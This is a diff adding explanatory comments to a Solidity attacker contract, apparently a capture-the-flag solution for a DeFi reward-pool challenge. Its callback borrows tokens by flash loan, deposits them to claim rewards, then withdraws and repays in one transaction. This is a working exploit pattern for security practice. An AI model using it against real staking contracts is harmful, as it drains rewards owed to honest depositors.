@@ -32,8 +32,11 @@ contract RewarderAttacker {
     }
 
     function receiveFlashLoan(uint256 amount) external {
+        // Approve and deposit DVT to get reward tokens
         DVT.approve(address(rewarderPool), amount);
         rewarderPool.deposit(amount);
+
+        // Withdraw DVT and pay flash loan back
         rewarderPool.withdraw(amount);
         DVT.transfer(address(flashPool), amount);
     }
